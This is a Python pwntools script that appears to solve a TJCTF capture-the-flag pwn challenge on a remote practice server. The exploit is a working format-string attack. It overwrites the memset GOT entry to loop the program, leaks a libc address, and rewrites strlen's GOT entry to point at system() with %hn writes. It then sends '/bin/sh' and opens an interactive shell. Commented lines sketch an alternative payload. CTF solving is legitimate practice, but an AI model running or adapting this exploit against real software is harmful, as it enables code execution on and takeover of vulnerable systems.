#!/usr/bin/env python

from pwn import *

LIBC 			= 0x7ffff7dd07e3
SYSTEM_LIBC		= 0x7ffff7a33440
STRLEN_LIBC		= 0x7ffff7a81c70
MEMSET 			= 0x602050
STRLEN 			= 0x602028
SECURE_SERVICE 	= 0x400da0

# r = process('./sss')
# gdb.attach(r, '''
# 	set disable-randomization off
# 	break get_message
# 	c
# 	''')
# pause()

r = remote("problem1.tjctf.org", 8009)

def recieve():
	r.recvuntil("Commands:") #wew below statement was breaking early
	r.recvuntil("> ")

def send(s):
	# create string with password a, then access and FAIL captcha
	r.sendline('s\na\n{0}\nv\na\nfail'.format(s))

def send_success(s):
	r.sendline('s\na\n{0}\nv\na'.format(s))
	r.recvuntil("Captcha:")
	captcha = r.recv().strip()
	# log.info("captcha is: " + captcha)
	r.sendline(captcha)

recieve()

#overwrite memset so we get infinite attempts
# log.info("memset payload: " + '%{}x%28$ln'.format(0x400da0).rjust(16) + p64(0x602050))
log.info("Overwriting memset() to point back to secure_service()...")
send('%{}x%28$ln'.format(SECURE_SERVICE - 1).rjust(16) + p64(MEMSET))

recieve()

#leak
log.info("Leaking libc...")
send('%lx')
r.recvuntil('====================\n')
libc_leak = int(r.recvuntil('\n').strip(), 16) # don't forget to strip() otherwise you get 40mb of whitespace
recieve()

#calc
SYSTEM_LEAK = SYSTEM_LIBC - LIBC + libc_leak
STRLEN_LEAK = STRLEN_LIBC - LIBC + libc_leak
sl1 = SYSTEM_LEAK & 0xffff
sl2 = SYSTEM_LEAK >> 16 & 0xffff
log.info('leak: ' + hex(libc_leak))
log.info('system: ' + hex(SYSTEM_LEAK))
log.info('strlen: ' + hex(STRLEN_LEAK))
log.info('s1: {0}'.format(hex(sl1)))
log.info('s2: {0}'.format(hex(sl2)))

if sl1 < sl2:
	log.info("sl1 < sl2")
	payload = '%{}x%30$hn%{}x%31$hn'.format(sl1-6, sl2-sl1).rjust(32) + p64(STRLEN) + p64(STRLEN+2)
else:
	log.info("sl2 < sl1")
	payload = '%{}x%30$hn%{}x%31$hn'.format(sl2-6, sl1-sl2).rjust(32) + p64(STRLEN+2) + p64(STRLEN)

log.info("Payload: " + payload)
log.info("Overwriting strlen with system...")
#overwrite strlen.
send(payload)
recieve()

log.info("Gettting a shell...")
r.sendline("h\ns\n/bin/sh")
r.interactive()

# tup = (sl1,sl2,sl3)
# log.info("Original order: " + str(tup))
# stup = sorted(tup)
# log.info("New order: " + str(stup))
# order = (tup.index(stup[0]), tup.index(stup[1]), tup.index(stup[2]))
# log.info("Order compared to original: " + str(order))
# stup2 = (stup[0], stup[1]-stup[0], stup[2]-stup[1])
# log.info("Bytes to be written: " + str(stup2))
# payload = '%{}x%{}$hn%{}x%{}$hn%{}x%{}$hn'.format(stup2[0], p64(MEMSET + 2*order[0]),\
# 	 stup2[1], p64(MEMSET + 2*order[1]), stup2[2], p64(MEMSET + 2*order[2])).rjust(64)
# log.info("Generated payload: " + payload)


# %4294967295x%29$ln

# 26$n
# overwrite strlen in one go....somehow.
# send('%{}x%29$ln'.format(sl_ - 1).rjust(24) + p64(STRLEN))
# recieve()

# r.interactive()